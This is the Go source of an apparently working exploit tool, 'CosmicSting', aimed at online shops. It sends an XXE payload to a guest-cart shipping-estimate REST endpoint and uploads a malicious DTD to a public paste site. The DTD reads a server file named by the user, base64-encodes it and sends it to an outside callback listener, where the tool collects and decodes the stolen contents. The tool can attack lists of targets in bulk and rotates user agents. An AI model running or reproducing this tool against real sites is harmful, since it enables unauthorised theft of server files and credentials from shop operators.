package main

import (
    "bufio"
    "bytes"
    "crypto/tls"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "math/rand"
    "mime/multipart"
    "net/http"
    "os"
    "regexp"
    "strings"
    "time"

    "github.com/fatih/color"
    "github.com/google/uuid"
    "github.com/urfave/cli/v2"
)

type CosmicSting struct {
    url        string
    file       string
    dtdUrl     string
    instanceId string
}

func NewCosmicSting(url, file string) *CosmicSting {
    return &CosmicSting{url: url, file: file}
}

func (cs *CosmicSting) printMessage(message, header string) {
    var colorFunc func(format string, a ...interface{}) string

    switch header {
    case "+":
        colorFunc = color.New(color.FgGreen).SprintfFunc()
    case "-":
        colorFunc = color.New(color.FgRed).SprintfFunc()
    case "!":
        colorFunc = color.New(color.FgYellow).SprintfFunc()
    case "*":
        colorFunc = color.New(color.FgBlue).SprintfFunc()
    default:
        colorFunc = color.New(color.FgWhite).SprintfFunc()
    }

    formattedMessage := colorFunc("[%s] ", header) + color.New(color.FgWhite).Sprintf(message)
    fmt.Println(formattedMessage)
}

func (cs *CosmicSting) createCallbackUrl() error {
    dtdData := fmt.Sprintf(`<!ENTITY %% data SYSTEM "php://filter/convert.base64-encode/resource=%s">
<!ENTITY %% param1 "<!ENTITY exfil SYSTEM 'https://%s.c5.rs/?exploited=%%data;'>">`, cs.file, cs.instanceId)
    url := "https://fars.ee/"
    randomFilename := uuid.New().String()

    var postBody bytes.Buffer
    writer := multipart.NewWriter(&postBody)
    part, err := writer.CreateFormFile("c", randomFilename)
    if err != nil {
        return err
    }
    part.Write([]byte(dtdData))
    writer.Close()

    resp, err := http.Post(url, writer.FormDataContentType(), &postBody)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return err
    }

    re := regexp.MustCompile(fmt.Sprintf("%s(?P<uuid>[a-zA-Z0-9\\-]+)", url))
    match := re.FindStringSubmatch(string(body))
    if len(match) == 0 {
        return fmt.Errorf("failed to extract the UUID using regex")
    }

    uuidValue := match[1]
    cs.dtdUrl = fmt.Sprintf("%s%s.dtd", url, uuidValue)
    cs.printMessage(fmt.Sprintf("Created Callback URL: %s", cs.dtdUrl), "+")
    cs.printMessage(fmt.Sprintf("File to be read: %s", cs.file), "+")
    return nil
}

func (cs *CosmicSting) obtainInstance() (string, error) {
    baseURL := "https://api.cvssadvisor.com/ssrf/api/instance"
    req, err := http.NewRequest("POST", baseURL, nil)
    if err != nil {
        return "", err
    }

    ua := randomUserAgent()
    req.Header.Set("User-Agent", ua)

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return "", err
    }

    instanceId := strings.Trim(string(body), "\"")
    return instanceId, nil
}

func (cs *CosmicSting) checkInstanceLog(instanceId, url string) (bool, error) {
    baseURL := fmt.Sprintf("https://api.cvssadvisor.com/ssrf/api/instance/%s", instanceId)
    req, err := http.NewRequest("GET", baseURL, nil)
    if err != nil {
        return false, err
    }

    ua := randomUserAgent()
    req.Header.Set("User-Agent", ua)

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return false, err
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return false, err
    }

    raw_data := string(body)
    if strings.Contains(raw_data, "/?exploited=") {
        re := regexp.MustCompile(`exploited=(.*) HTTP`)
        match := re.FindStringSubmatch(raw_data)
        if len(match) > 1 {
            exploited_data := match[1]
            decoded_data, err := base64.StdEncoding.DecodeString(exploited_data)
            if err != nil {
                return false, err
            }
            cs.printMessage(fmt.Sprintf("Decoded Exploited Data: \n%s", string(decoded_data)), "+")
            return true, nil
        }
    }

    return false, nil
}

func (cs *CosmicSting) clearInstance(instanceId string) error {
    baseURL := fmt.Sprintf("https://api.cvssadvisor.com/ssrf/api/instance/%s/clear", instanceId)
    req, err := http.NewRequest("DELETE", baseURL, nil)
    if err != nil {
        return err
    }

    ua := randomUserAgent()
    req.Header.Set("User-Agent", ua)

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    return nil
}

func (cs *CosmicSting) removeInstance(instanceId string) error {
    baseURL := fmt.Sprintf("https://api.cvssadvisor.com/ssrf/api/instance/%s", instanceId)
    req, err := http.NewRequest("DELETE", baseURL, nil)
    if err != nil {
        return err
    }

    ua := randomUserAgent()
    req.Header.Set("User-Agent", ua)

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    return nil
}

func (cs *CosmicSting) sendRequest(url string) error {
    baseURL := fmt.Sprintf("%s/rest/V1/guest-carts/1/estimate-shipping-methods", url)
    body := map[string]interface{}{
        "address": map[string]interface{}{
            "totalsCollector": map[string]interface{}{
                "collectorList": map[string]interface{}{
                    "totalCollector": map[string]interface{}{
                        "sourceData": map[string]interface{}{
                            "data": fmt.Sprintf(`<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY %% sp SYSTEM "%s"> %%sp; %%param1; ]> <r>&exfil;</r>`, cs.dtdUrl),
                            "options": 12345678,
                        },
                    },
                },
            },
        },
    }

    jsonBody, err := json.Marshal(body)
    if err != nil {
        return err
    }

    req, err := http.NewRequest("POST", baseURL, bytes.NewBuffer(jsonBody))
    if err != nil {
        return err
    }

    ua := randomUserAgent()
    req.Header.Set("User-Agent", ua)
    req.Header.Set("Content-Type", "application/json")

    // Disable TLS verification
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}

    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    // Debugging: Print the response status and body
    respBody, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return err
    }
    cs.printMessage(fmt.Sprintf("Response Status: %s", resp.Status), "!")
    cs.printMessage(fmt.Sprintf("Response Body: %s", string(respBody)), "!")

    return nil
}

func (cs *CosmicSting) executeExploit(url string) {
    err := cs.sendRequest(url)
    if err != nil {
        log.Fatalf("Failed to send request: %v", err)
    }

    isExploited, err := cs.checkInstanceLog(cs.instanceId, url)
    if err != nil {
        log.Fatalf("Failed to check instance log: %v", err)
    }

    if isExploited {
        cs.printMessage(fmt.Sprintf("Vulnerable URL: %s", url), "+")
    } else {
        cs.printMessage(fmt.Sprintf("Not Vulnerable URL: %s", url), "-")
    }

    if err := cs.clearInstance(cs.instanceId); err != nil {
        log.Fatalf("Failed to clear instance: %v", err)
    }
}

func (cs *CosmicSting) run(urls []string) {
    var err error
    cs.instanceId, err = cs.obtainInstance()
    if err != nil {
        log.Fatalf("Unable to create an interactive SSRF server: %v", err)
    }

    if err := cs.createCallbackUrl(); err != nil {
        log.Fatalf("Failed to create callback URL: %v", err)
    }

    for _, url := range urls {
        cs.executeExploit(url)
    }
}

func readUrlsFromFile(filePath string) ([]string, error) {
    var urls []string

    file, err := os.Open(filePath)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        urls = append(urls, scanner.Text())
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }

    return urls, nil
}

func main() {
    app := cli.NewApp()
    app.Flags = []cli.Flag{
        &cli.StringFlag{
            Name:     "url",
            Aliases:  []string{"u"},
            Required: false,
            Usage:    "Target URL to exploit",
        },
        &cli.StringFlag{
            Name:     "file",
            Aliases:  []string{"f"},
            Required: true,
            Usage:    "File to read via SSRF",
        },
        &cli.StringFlag{
            Name:     "list",
            Aliases:  []string{"l"},
            Required: false,
            Usage:    "File containing list of URLs to exploit",
        },
    }
    app.Action = func(c *cli.Context) error {
        url := c.String("url")
        file := c.String("file")
        urlListFile := c.String("list")

        cosmicSting := NewCosmicSting(url, file)

        var urls []string
        if urlListFile != "" {
            fileUrls, err := readUrlsFromFile(urlListFile)
            if err != nil {
                log.Fatalf("Failed to read URLs from file: %v", err)
            }
            urls = fileUrls
        } else if url != "" {
            urls = append(urls, url)
        } else {
            log.Fatalf("You must provide either a single URL (-u) or a file with URLs (-l)")
        }

        cosmicSting.run(urls)

        return nil
    }

    err := app.Run(os.Args)
    if err != nil {
        log.Fatal(err)
    }
}

func randomUserAgent() string {
    userAgents := []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
    }
    rand.Seed(time.Now().UnixNano())
    return userAgents[rand.Intn(len(userAgents))]
}
